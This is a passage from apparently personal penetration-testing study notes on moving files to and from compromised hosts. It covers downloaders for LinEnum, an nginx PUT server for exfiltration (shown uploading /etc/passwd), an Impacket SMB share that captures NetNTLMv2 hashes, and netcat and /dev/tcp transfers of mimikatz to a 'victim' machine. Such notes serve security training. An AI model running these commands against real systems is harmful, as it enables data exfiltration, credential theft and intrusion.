</code></pre></div> <hr> <h2 id=other-languages>Other Languages<a class=headerlink href=#other-languages title="Permanent link">&para;</a></h2> <p>Ruby <div class=highlight><pre><span></span><code><a id=__codelineno-29-1 name=__codelineno-29-1 href=#__codelineno-29-1></a><span class=n>hrmns</span><span class=vi>@htb</span><span class=o>[</span><span class=sr>/htb]$ ruby -e &#39;require &quot;net/</span><span class=n>http</span><span class=s2>&quot;; File.write(&quot;</span><span class=no>LinEnum</span><span class=o>.</span><span class=n>sh</span><span class=s2>&quot;, Net::HTTP.get(URI.parse(&quot;</span><span class=ss>https</span><span class=p>:</span><span class=sr>//</span><span class=n>raw</span><span class=o>.</span><span class=n>githubusercontent</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>rebootuser</span><span class=o>/</span><span class=no>LinEnum</span><span class=o>/</span><span class=n>master</span><span class=o>/</span><span class=no>LinEnum</span><span class=o>.</span><span class=n>sh</span><span class=s2>&quot;)))&#39;</span>
</code></pre></div></p> <p>Perl <div class=highlight><pre><span></span><code><a id=__codelineno-30-1 name=__codelineno-30-1 href=#__codelineno-30-1></a><span class=n>hrmns</span><span class=nv>@htb</span><span class=p>[</span><span class=sr>/htb]$ perl -e &#39;use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/</span><span class=n>rebootuser</span><span class=sr>/LinEnum/m</span><span class=n>aster</span><span class=o>/</span><span class=n>LinEnum</span><span class=o>.</span><span class=n>sh</span><span class=s>&quot;, &quot;</span><span class=n>LinEnum</span><span class=o>.</span><span class=n>sh</span><span class=err>&quot;</span><span class=p>);</span><span class=err>&#39;</span>
</code></pre></div></p> <p>Go <div class=highlight><pre><span></span><code><a id=__codelineno-31-1 name=__codelineno-31-1 href=#__codelineno-31-1></a><span class=kn>package</span><span class=w> </span><span class=nx>main</span><span class=w></span>
<a id=__codelineno-31-2 name=__codelineno-31-2 href=#__codelineno-31-2></a>
<a id=__codelineno-31-3 name=__codelineno-31-3 href=#__codelineno-31-3></a><span class=kn>import</span><span class=w> </span><span class=p>(</span><span class=w></span>
<a id=__codelineno-31-4 name=__codelineno-31-4 href=#__codelineno-31-4></a><span class=w>     </span><span class=s>&quot;os&quot;</span><span class=w></span>
<a id=__codelineno-31-5 name=__codelineno-31-5 href=#__codelineno-31-5></a><span class=w>     </span><span class=s>&quot;io&quot;</span><span class=w></span>
<a id=__codelineno-31-6 name=__codelineno-31-6 href=#__codelineno-31-6></a><span class=w>     </span><span class=s>&quot;net/http&quot;</span><span class=w></span>
<a id=__codelineno-31-7 name=__codelineno-31-7 href=#__codelineno-31-7></a><span class=p>)</span><span class=w></span>
<a id=__codelineno-31-8 name=__codelineno-31-8 href=#__codelineno-31-8></a>
<a id=__codelineno-31-9 name=__codelineno-31-9 href=#__codelineno-31-9></a><span class=kd>func</span><span class=w> </span><span class=nx>main</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w></span>
<a id=__codelineno-31-10 name=__codelineno-31-10 href=#__codelineno-31-10></a><span class=w>     </span><span class=nx>lfile</span><span class=p>,</span><span class=w> </span><span class=nx>err</span><span class=w> </span><span class=o>:=</span><span class=w> </span><span class=nx>os</span><span class=p>.</span><span class=nx>Create</span><span class=p>(</span><span class=s>&quot;LinEnum.sh&quot;</span><span class=p>)</span><span class=w></span>
<a id=__codelineno-31-11 name=__codelineno-31-11 href=#__codelineno-31-11></a><span class=w>     </span><span class=nx>_</span><span class=w> </span><span class=p>=</span><span class=w> </span><span class=nx>err</span><span class=w></span>
<a id=__codelineno-31-12 name=__codelineno-31-12 href=#__codelineno-31-12></a><span class=w>     </span><span class=k>defer</span><span class=w> </span><span class=nx>lfile</span><span class=p>.</span><span class=nx>Close</span><span class=p>()</span><span class=w></span>
<a id=__codelineno-31-13 name=__codelineno-31-13 href=#__codelineno-31-13></a>
<a id=__codelineno-31-14 name=__codelineno-31-14 href=#__codelineno-31-14></a><span class=w>     </span><span class=nx>rfile</span><span class=w> </span><span class=o>:=</span><span class=w> </span><span class=s>&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;</span><span class=w></span>
<a id=__codelineno-31-15 name=__codelineno-31-15 href=#__codelineno-31-15></a><span class=w>     </span><span class=nx>response</span><span class=p>,</span><span class=w> </span><span class=nx>err</span><span class=w> </span><span class=o>:=</span><span class=w> </span><span class=nx>http</span><span class=p>.</span><span class=nx>Get</span><span class=p>(</span><span class=nx>rfile</span><span class=p>)</span><span class=w></span>
<a id=__codelineno-31-16 name=__codelineno-31-16 href=#__codelineno-31-16></a><span class=w>     </span><span class=k>defer</span><span class=w> </span><span class=nx>response</span><span class=p>.</span><span class=nx>Body</span><span class=p>.</span><span class=nx>Close</span><span class=p>()</span><span class=w></span>
<a id=__codelineno-31-17 name=__codelineno-31-17 href=#__codelineno-31-17></a>
<a id=__codelineno-31-18 name=__codelineno-31-18 href=#__codelineno-31-18></a><span class=w>     </span><span class=nx>io</span><span class=p>.</span><span class=nx>Copy</span><span class=p>(</span><span class=nx>lfile</span><span class=p>,</span><span class=w> </span><span class=nx>response</span><span class=p>.</span><span class=nx>Body</span><span class=p>)</span><span class=w></span>
<a id=__codelineno-31-19 name=__codelineno-31-19 href=#__codelineno-31-19></a><span class=p>}</span><span class=w></span>
</code></pre></div></p> <hr> <h1 id=catching-files-over-httpsmb>Catching Files over HTTP/SMB<a class=headerlink href=#catching-files-over-httpsmb title="Permanent link">&para;</a></h1> <h2 id=nginx-enable-put>Nginx Enable PUT<a class=headerlink href=#nginx-enable-put title="Permanent link">&para;</a></h2> <p>When allowing <strong>HTTP</strong> Uploads, it is critical to be 100% positive users cannot upload web shells and then execute it. <strong>Apache</strong> makes it easy to shoot ourselves in the foot with this, as the <strong>PHP</strong> Module loves to execute anything ending in <strong>PHP</strong>. Configuring <strong>NGINX</strong> to use PHP is nowhere near as simple.</p> <ol> <li>Create a directory to handle uploaded files</li> </ol> <div class=highlight><pre><span></span><code><a id=__codelineno-32-1 name=__codelineno-32-1 href=#__codelineno-32-1></a><span class=gp>hrmns@htb[/htb]$ </span>sudo mkdir -p /var/www/uploads/SecretUploadDirectory
</code></pre></div> <ol> <li>Change the owner to www-data</li> </ol> <div class=highlight><pre><span></span><code><a id=__codelineno-33-1 name=__codelineno-33-1 href=#__codelineno-33-1></a><span class=gp>hrmns@htb[/htb]$ </span>sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
</code></pre></div> <ol> <li>Create the NGINX Configuration file, by creating the file <strong>/etc/nginx/sites-available/upload.conf</strong> with the contents:</li> </ol> <div class=highlight><pre><span></span><code><a id=__codelineno-34-1 name=__codelineno-34-1 href=#__codelineno-34-1></a><span class=go>server {</span>
<a id=__codelineno-34-2 name=__codelineno-34-2 href=#__codelineno-34-2></a><span class=go>    listen 9001;</span>
<a id=__codelineno-34-3 name=__codelineno-34-3 href=#__codelineno-34-3></a>
<a id=__codelineno-34-4 name=__codelineno-34-4 href=#__codelineno-34-4></a><span class=go>    location /SecretUploadDirectory/ {</span>
<a id=__codelineno-34-5 name=__codelineno-34-5 href=#__codelineno-34-5></a><span class=go>        root    /var/www/uploads;</span>
<a id=__codelineno-34-6 name=__codelineno-34-6 href=#__codelineno-34-6></a><span class=go>        dav_methods PUT;</span>
<a id=__codelineno-34-7 name=__codelineno-34-7 href=#__codelineno-34-7></a><span class=go>    }</span>
<a id=__codelineno-34-8 name=__codelineno-34-8 href=#__codelineno-34-8></a><span class=go>}</span>
</code></pre></div> <ol> <li>Symlink our site to the sites-enabled directory</li> </ol> <div class=highlight><pre><span></span><code><a id=__codelineno-35-1 name=__codelineno-35-1 href=#__codelineno-35-1></a><span class=gp>hrmns@htb[/htb]$ </span>sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
</code></pre></div> <ol> <li>Start nginx</li> </ol> <div class=highlight><pre><span></span><code><a id=__codelineno-36-1 name=__codelineno-36-1 href=#__codelineno-36-1></a><span class=gp>hrmns@htb[/htb]$ </span>sudo systemctl restart nginx.service
</code></pre></div> <ol> <li>If we get any error messages, be sure to check /var/log/nginx/error.log</li> </ol> <p><div class=highlight><pre><span></span><code><a id=__codelineno-37-1 name=__codelineno-37-1 href=#__codelineno-37-1></a><span class=gp>root@localhost# </span>tail -2 <span class=sb>`</span>/var/log/nginx/error.log<span class=sb>`</span>
<a id=__codelineno-37-2 name=__codelineno-37-2 href=#__codelineno-37-2></a>
<a id=__codelineno-37-3 name=__codelineno-37-3 href=#__codelineno-37-3></a><span class=go>2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)</span>
<a id=__codelineno-37-4 name=__codelineno-37-4 href=#__codelineno-37-4></a><span class=go>2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()</span>
<a id=__codelineno-37-5 name=__codelineno-37-5 href=#__codelineno-37-5></a>
<a id=__codelineno-37-6 name=__codelineno-37-6 href=#__codelineno-37-6></a><span class=gp>root@localhost#</span>: ss -lnpt <span class=p>|</span> grep <span class=sb>`</span><span class=m>80</span><span class=sb>`</span>
<a id=__codelineno-37-7 name=__codelineno-37-7 href=#__codelineno-37-7></a>
<a id=__codelineno-37-8 name=__codelineno-37-8 href=#__codelineno-37-8></a><span class=go>LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:((&quot;python&quot;,pid=`2811`,fd=3),(&quot;python&quot;,pid=2070,fd=3),(&quot;python&quot;,pid=1968,fd=3),(&quot;python&quot;,pid=1856,fd=3))</span>
<a id=__codelineno-37-9 name=__codelineno-37-9 href=#__codelineno-37-9></a>
<a id=__codelineno-37-10 name=__codelineno-37-10 href=#__codelineno-37-10></a><span class=gp>root@localhost#</span>: ps -ef <span class=p>|</span> grep <span class=sb>`</span><span class=m>2811</span><span class=sb>`</span>
<a id=__codelineno-37-11 name=__codelineno-37-11 href=#__codelineno-37-11></a>
<a id=__codelineno-37-12 name=__codelineno-37-12 href=#__codelineno-37-12></a><span class=go>user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`</span>
<a id=__codelineno-37-13 name=__codelineno-37-13 href=#__codelineno-37-13></a><span class=go>root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811</span>
</code></pre></div> 6. We see there is already a module listening on port 80. To get around this, we can remove the default NGINX Configuration which binds on port 80.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-38-1 name=__codelineno-38-1 href=#__codelineno-38-1></a><span class=gp>hrmns@htb[/htb]$ </span>sudo rm /etc/nginx/sites-enabled/default
</code></pre></div> <p>Test upload by using <strong>cURL</strong> to send a <strong>PUT</strong> request. In the below example, we will upload the <strong>/etc/passwd</strong> file to the server and call it users.txt</p> <div class=highlight><pre><span></span><code><a id=__codelineno-39-1 name=__codelineno-39-1 href=#__codelineno-39-1></a><span class=gp>root@localhost# </span>curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
<a id=__codelineno-39-2 name=__codelineno-39-2 href=#__codelineno-39-2></a><span class=gp>root@localhost# </span>tail -1 /var/www/upload/SecretUploadDirectory/users.txt 
<a id=__codelineno-39-3 name=__codelineno-39-3 href=#__codelineno-39-3></a>
<a id=__codelineno-39-4 name=__codelineno-39-4 href=#__codelineno-39-4></a><span class=go>user65:x:1000:1000:,,,:/home/user65:/bin/bash</span>
</code></pre></div> <p>Once we have this working, a good test is to make sure "File Listings" is not available by navigating to "http://localhost/SecretUploadDirectory". By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most of the files are sensitive by nature, and we want to do our best to hide them. Thanks to NGINX being minimal, features like that are not enabled by default.</p> <hr> <h1 id=smb>SMB<a class=headerlink href=#smb title="Permanent link">&para;</a></h1> <h2 id=impacket-smbserver>Impacket SMBServer<a class=headerlink href=#impacket-smbserver title="Permanent link">&para;</a></h2> <p><a href=https://github.com/SecureAuthCorp/impacket>Impacket</a> is my preferred method of setting up a file transfer over <strong>SMB</strong> because it does not run in the background or involve modifying configuration files. We can use <a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py>smbserver.py</a> specifically. If other people attempt to connect to the service, it has the bonus that it will display a NetNTLMv2 hash that, if successfully cracked, will reveal the password.</p> <p>Impacket SMBServer - Syntax</p> <div class=highlight><pre><span></span><code><a id=__codelineno-40-1 name=__codelineno-40-1 href=#__codelineno-40-1></a><span class=gp>hrmns@htb[/htb]$ </span>/usr/share/doc/python3-impacket/examples/smbserver.py -smb2support &lt;share name&gt; &lt;location&gt;
</code></pre></div> <p>Always to have a separate order for file transfers to prevent unauthorized persons from gaining access to our local data. If we would use our home directory to transfer the desired data and an unauthorized person accesses it, he will be able to navigate to the ".ssh" directory and find the SSH keys, which can be used against us.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-41-1 name=__codelineno-41-1 href=#__codelineno-41-1></a><span class=gp>hrmns@htb[/htb]$ </span>mkdir Transfers <span class=o>&amp;&amp;</span> <span class=nb>cd</span> Transfers
<a id=__codelineno-41-2 name=__codelineno-41-2 href=#__codelineno-41-2></a><span class=gp>hrmns@htb[/htb]$ </span>/usr/share/doc/python3-impacket/examples/smbserver.py -smb2support FileTransfer <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>
</code></pre></div> <p>To verify the share was created and accessible, we can run:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-42-1 name=__codelineno-42-1 href=#__codelineno-42-1></a><span class=gp>hrmns@htb[/htb]$ </span>sudo smbclient -L <span class=m>127</span>.0.0.1
<a id=__codelineno-42-2 name=__codelineno-42-2 href=#__codelineno-42-2></a>
<a id=__codelineno-42-3 name=__codelineno-42-3 href=#__codelineno-42-3></a><span class=go>Enter WORKGROUP\root&#39;s password: </span>
<a id=__codelineno-42-4 name=__codelineno-42-4 href=#__codelineno-42-4></a>
<a id=__codelineno-42-5 name=__codelineno-42-5 href=#__codelineno-42-5></a><span class=go>    Sharename       Type      Comment</span>
<a id=__codelineno-42-6 name=__codelineno-42-6 href=#__codelineno-42-6></a><span class=go>    ---------       ----      -------</span>
<a id=__codelineno-42-7 name=__codelineno-42-7 href=#__codelineno-42-7></a><span class=go>    IPC$            Disk      </span>
<a id=__codelineno-42-8 name=__codelineno-42-8 href=#__codelineno-42-8></a><span class=go>    FileTransfer    Disk      </span>
<a id=__codelineno-42-9 name=__codelineno-42-9 href=#__codelineno-42-9></a><span class=go>SMB1 disabled -- no workgroup available</span>
</code></pre></div> <p>Going to our <strong>Impacket</strong> terminal, we can see the connection and if we had not known the user's password before. We could use the line under "Authenticated Successfully" to <strong>Hashcat</strong> and attempt to crack it.</p> <p>Impacket SMBServer - Listening</p> <div class=highlight><pre><span></span><code><a id=__codelineno-43-1 name=__codelineno-43-1 href=#__codelineno-43-1></a><span class=go>[*] Config file parsed</span>
<a id=__codelineno-43-2 name=__codelineno-43-2 href=#__codelineno-43-2></a><span class=go>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span>
<a id=__codelineno-43-3 name=__codelineno-43-3 href=#__codelineno-43-3></a><span class=go>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span>
<a id=__codelineno-43-4 name=__codelineno-43-4 href=#__codelineno-43-4></a><span class=go>[*] Config file parsed</span>
<a id=__codelineno-43-5 name=__codelineno-43-5 href=#__codelineno-43-5></a><span class=go>[*] Config file parsed</span>
<a id=__codelineno-43-6 name=__codelineno-43-6 href=#__codelineno-43-6></a><span class=go>[*] Config file parsed</span>
<a id=__codelineno-43-7 name=__codelineno-43-7 href=#__codelineno-43-7></a><span class=go>[*] Incoming connection (127.0.0.1,38928)</span>
<a id=__codelineno-43-8 name=__codelineno-43-8 href=#__codelineno-43-8></a><span class=go>[*] AUTHENTICATE_MESSAGE (WORKGROUP\root,PARROT)</span>
<a id=__codelineno-43-9 name=__codelineno-43-9 href=#__codelineno-43-9></a><span class=go>[*] User PARROT\root authenticated successfully</span>
<a id=__codelineno-43-10 name=__codelineno-43-10 href=#__codelineno-43-10></a><span class=go>[*] root::WORKGROUP:4141414141414141:926ebbd136be706117721fbcad821410:01010000000000008039147afabcd601a3099ada8208fd2c00000000010010004a006e00640046006700460075007000030010004a006e0064004600670046007500700002001000640062005a0054005300490054004b0004001000640062005a0054005300490054004b00070008008039147afabcd6010600040002000000080030003000000000000000000000000000000054af210c79b6f4bd986d404d7769e730cecdf6b2feec6c6d5cd8a765d98034bb0a0010000000000000000000000000000000000009001c0063006900660073002f003100320037002e0030002e0030002e00310000000000</span>
<a id=__codelineno-43-11 name=__codelineno-43-11 href=#__codelineno-43-11></a><span class=go>[*] Connecting Share(1:IPC$)</span>
<a id=__codelineno-43-12 name=__codelineno-43-12 href=#__codelineno-43-12></a><span class=go>[*] NetrShareEnum Level: 1</span>
<a id=__codelineno-43-13 name=__codelineno-43-13 href=#__codelineno-43-13></a><span class=go>[*] Disconnecting Share(1:IPC$)</span>
<a id=__codelineno-43-14 name=__codelineno-43-14 href=#__codelineno-43-14></a><span class=go>[*] Closing down connection (127.0.0.1,38928)</span>
<a id=__codelineno-43-15 name=__codelineno-43-15 href=#__codelineno-43-15></a><span class=go>[*] Remaining connections []</span>
</code></pre></div> <p>In some cases, computers will not allow anonymous <strong>SMB</strong> connections. In this case, we may want to use the user/password flags to allow authentication on our <strong>SMB</strong> server. This can be done with the following command:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-44-1 name=__codelineno-44-1 href=#__codelineno-44-1></a><span class=gp>hrmns@htb[/htb]$ </span>/usr/share/doc/python3-impacket/examples/smbserver.py -user USERNAME -password PASSWORD FileTransfer <span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>
</code></pre></div> <hr> <h1 id=miscellaneous-file-transfer-methods>Miscellaneous File Transfer Methods<a class=headerlink href=#miscellaneous-file-transfer-methods title="Permanent link">&para;</a></h1> <h2 id=web-servers>Web Servers<a class=headerlink href=#web-servers title="Permanent link">&para;</a></h2> <p>A compromised Linux machine may not have a web server installed or access to the Internet, so a mini web server can be used. What they perhaps lack in security, they make up for in flexibility, as the webroot location and listening ports can quickly be changed.</p> <p>Python2 <div class=highlight><pre><span></span><code><a id=__codelineno-45-1 name=__codelineno-45-1 href=#__codelineno-45-1></a><span class=gp>hrmns@htb[/htb]$ </span>python -m SimpleHTTPServer <span class=m>8080</span>
</code></pre></div></p> <p>Python3 <div class=highlight><pre><span></span><code><a id=__codelineno-46-1 name=__codelineno-46-1 href=#__codelineno-46-1></a><span class=gp>hrmns@htb[/htb]$ </span>python3 -m http.server <span class=m>8080</span>
</code></pre></div></p> <p>Ruby <div class=highlight><pre><span></span><code><a id=__codelineno-47-1 name=__codelineno-47-1 href=#__codelineno-47-1></a><span class=gp>hrmns@htb[/htb]$ </span>ruby -run -ehttpd . -p8080
</code></pre></div></p> <p>PHP <div class=highlight><pre><span></span><code><a id=__codelineno-48-1 name=__codelineno-48-1 href=#__codelineno-48-1></a><span class=gp>hrmns@htb[/htb]$ </span>php -S <span class=m>0</span>.0.0.0:8080
</code></pre></div></p> <p>Socat <div class=highlight><pre><span></span><code><a id=__codelineno-49-1 name=__codelineno-49-1 href=#__codelineno-49-1></a><span class=gp>hrmns@htb[/htb]$ </span>socat TCP-LISTEN:8080,reuseaddr,fork
</code></pre></div></p> <p>With administrative access to a Windows machine, IIS can be easily installed. <div class=highlight><pre><span></span><code><a id=__codelineno-50-1 name=__codelineno-50-1 href=#__codelineno-50-1></a><span class=go>PS C:\htb&gt; Add-WindowsFeature Web-Server, Web-Mgmt-Tools</span>
</code></pre></div></p> <hr> <h2 id=smb-webdav>SMB / WebDAV<a class=headerlink href=#smb-webdav title="Permanent link">&para;</a></h2> <p><strong>SMB</strong> is a good option for file transfers, as on Windows as you dont need to install anything. <strong>SMB</strong> traffic features prominently on networks, and SMB file transfers to Windows computers are expected. Unfortunately, its also the case that outbound <strong>SMB</strong> traffic is often allowed through the external firewall. In case SMB traffic through the firewall has been restricted, <a href=https://en.wikipedia.org/wiki/WebDAV>WebDAV</a> may be a good option, as it relies on <strong>HTTP</strong> as a transport protocol. Some common tools that support file transfers from <strong>SMB</strong> and <strong>WebDAV</strong> shares are reviewed below.</p> <hr> <h2 id=powershell>PowerShell<a class=headerlink href=#powershell title="Permanent link">&para;</a></h2> <p>Copy-Item</p> <div class=highlight><pre><span></span><code><a id=__codelineno-51-1 name=__codelineno-51-1 href=#__codelineno-51-1></a>PS C:\htb&gt; Copy-Item -Path C:\Temp\nc.exe -Destination C:\Temp\nc.exe -ToSession $session
</code></pre></div> <p>Set-Content <div class=highlight><pre><span></span><code><a id=__codelineno-52-1 name=__codelineno-52-1 href=#__codelineno-52-1></a>PS C:\htb&gt; $file = Get-Content C:\Temp\nc.exe -Raw
<a id=__codelineno-52-2 name=__codelineno-52-2 href=#__codelineno-52-2></a>PS C:\htb&gt; Invoke-Command -ComputerName 10.10.10.132 -ScriptBlock {Set-Content -Path C:\Temp\nc.exe -value $using:file}
</code></pre></div></p> <p>Copy / xcopy / robocopy <div class=highlight><pre><span></span><code><a id=__codelineno-53-1 name=__codelineno-53-1 href=#__codelineno-53-1></a>PS C:\htb&gt; xcopy \\10.10.10.132\share\nc.exe nc.exe
<a id=__codelineno-53-2 name=__codelineno-53-2 href=#__codelineno-53-2></a>PS C:\htb&gt; copy C:\Temp\nc.exe \\10.10.10.132\c$\Temp\nc.exe
</code></pre></div></p> <p>Map / Mount Drives <div class=highlight><pre><span></span><code><a id=__codelineno-54-1 name=__codelineno-54-1 href=#__codelineno-54-1></a>PS C:\htb&gt; net use Q: \\10.10.10.132\share
<a id=__codelineno-54-2 name=__codelineno-54-2 href=#__codelineno-54-2></a>PS C:\htb&gt; pushd \\10.10.10.132\share
<a id=__codelineno-54-3 name=__codelineno-54-3 href=#__codelineno-54-3></a>PS C:\htb&gt; mklink /D share \\10.10.10.132\share
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-55-1 name=__codelineno-55-1 href=#__codelineno-55-1></a><span class=gp>hrmns@htb[/htb]$ </span>smbclient //10.10.10.132/share -U username -W domain
</code></pre></div> <hr> <h2 id=netcat>Netcat<a class=headerlink href=#netcat title="Permanent link">&para;</a></h2> <p>The target or attacking machine can be used to initiate the connection, which is useful if a firewall prevents access to the target. </p> <p>Connection Initiated by Pentester</p> <div class=highlight><pre><span></span><code><a id=__codelineno-56-1 name=__codelineno-56-1 href=#__codelineno-56-1></a><span class=gp>victim@target:~$ </span>nc -nlvp <span class=m>8000</span> &gt; mimikatz.exe
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-57-1 name=__codelineno-57-1 href=#__codelineno-57-1></a><span class=gp>hrmns@htb[/htb]$ </span>nc -nv <span class=m>10</span>.10.10.132 <span class=m>8000</span> &lt;mimikatz.exe
</code></pre></div> <p>Connection Initiated by Target <div class=highlight><pre><span></span><code><a id=__codelineno-58-1 name=__codelineno-58-1 href=#__codelineno-58-1></a><span class=gp>hrmns@htb[/htb]$ </span>nc -nv <span class=m>10</span>.10.10.32 <span class=m>8000</span> &gt; mimikatz.exe
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-59-1 name=__codelineno-59-1 href=#__codelineno-59-1></a><span class=gp>victim@target:~$ </span>nc -nlvp <span class=m>8000</span> &lt;mimikatz.exe
</code></pre></div> <p>Netcat can also serve content for transfer by the /dev/tcp device file.</p> <p>Start nc listener</p> <div class=highlight><pre><span></span><code><a id=__codelineno-60-1 name=__codelineno-60-1 href=#__codelineno-60-1></a><span class=gp>hrmns@htb[/htb]$ </span>nc -lvnp <span class=m>80</span> &lt;LinEnum.sh
</code></pre></div> <p>Dl the file <div class=highlight><pre><span></span><code><a id=__codelineno-61-1 name=__codelineno-61-1 href=#__codelineno-61-1></a><span class=gp>victim@target:~$ </span>cat &lt; /dev/tcp/10.10.10.32/80 &gt; LinEnum.sh
</code></pre></div></p> <hr> <h2 id=scp>SCP<a class=headerlink href=#scp title="Permanent link">&para;</a></h2> <p>SCP Upload <div class=highlight><pre><span></span><code><a id=__codelineno-62-1 name=__codelineno-62-1 href=#__codelineno-62-1></a>PS C:\htb&gt; scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
</code></pre></div></p> <p>SCP Download <div class=highlight><pre><span></span><code><a id=__codelineno-63-1 name=__codelineno-63-1 href=#__codelineno-63-1></a><span class=gp>hrmns@htb[/htb]$ </span>scp user@target:/tmp/mimikatz.exe C:<span class=se>\T</span>emp<span class=se>\m</span>imikatz.exe
</code></pre></div></p> <hr> <h2 id=ftp>FTP<a class=headerlink href=#ftp title="Permanent link">&para;</a></h2> <p>Windows 10 includes a native FTP client, which can also read commands from a script to work in a non-interactive shell.</p> <p>Ftp-script.txt <div class=highlight><pre><span></span><code><a id=__codelineno-64-1 name=__codelineno-64-1 href=#__codelineno-64-1></a><span class=go>open 10.10.10.32</span>
<a id=__codelineno-64-2 name=__codelineno-64-2 href=#__codelineno-64-2></a><span class=go>anonymous</span>
<a id=__codelineno-64-3 name=__codelineno-64-3 href=#__codelineno-64-3></a><span class=go>anonymous</span>
<a id=__codelineno-64-4 name=__codelineno-64-4 href=#__codelineno-64-4></a><span class=go>lcd C:\Temp</span>
<a id=__codelineno-64-5 name=__codelineno-64-5 href=#__codelineno-64-5></a><span class=go>get nc.exe</span>
<a id=__codelineno-64-6 name=__codelineno-64-6 href=#__codelineno-64-6></a><span class=go>quit</span>
</code></pre></div></p> <div class=highlight><pre><span></span><code><a id=__codelineno-65-1 name=__codelineno-65-1 href=#__codelineno-65-1></a>PS C:\htb&gt; ftp -s:ftp-script.txt
</code></pre></div> <hr> <h2 id=tftp>TFTP<a class=headerlink href=#tftp title="Permanent link">&para;</a></h2> <p>The TFTP client is not available by default in Windows, but it can be enabled using DISM. \</p> <div class=highlight><pre><span></span><code><a id=__codelineno-66-1 name=__codelineno-66-1 href=#__codelineno-66-1></a>PS C:\htb&gt; DISM /online /Enable-Feature /FeatureName:TFTP
</code></pre></div> <p>In newer versions of Windows, the Install-WindowsFeature PowerShell cmdlet can also be used. Both DISM and Install-WindowsFeature require administrative access.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-67-1 name=__codelineno-67-1 href=#__codelineno-67-1></a>PS C:\htb&gt; Install-WindowsFeature TFTP-Client
</code></pre></div> <hr> <h2 id=rdp>RDP<a class=headerlink href=#rdp title="Permanent link">&para;</a></h2> <p>emote Desktop is often enabled on Windows machines, and from Linux, <strong>rdesktop</strong> can be used to expose a local folder in the remote RDP session.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-68-1 name=__codelineno-68-1 href=#__codelineno-68-1></a><span class=gp>hrmns@htb[/htb]$ </span>rdesktop <span class=m>10</span>.10.10.132 -r disk:linux<span class=o>=</span><span class=s1>&#39;/home/user/rdesktop/files&#39;</span>
</code></pre></div> <p>Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.</p> <p><img alt=alt src=https://academy.hackthebox.com/storage/modules/24/rdp.png></p> <p>After selecting the drive, we can interact with it in the remote session</p> <div class=highlight><pre><span></span><code><a id=__codelineno-69-1 name=__codelineno-69-1 href=#__codelineno-69-1></a>PS C:\htb&gt; copy \\tsclient\c\temp\mimikatz.exe .
</code></pre></div> <p>This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</p> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top data-md-state=hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../../windows_privesc/windows_desktop/ class="md-footer__link md-footer__link--prev" aria-label="Previous: Windows Desktop" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> Windows Desktop </div> </div> </a> <a href=../../networking/overview/ class="md-footer__link md-footer__link--next" aria-label="Next: Overview" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Overview </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2021 - 2022 dh </div> </div> <div class=md-social> <a href=https://github.com/hrmnsio target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 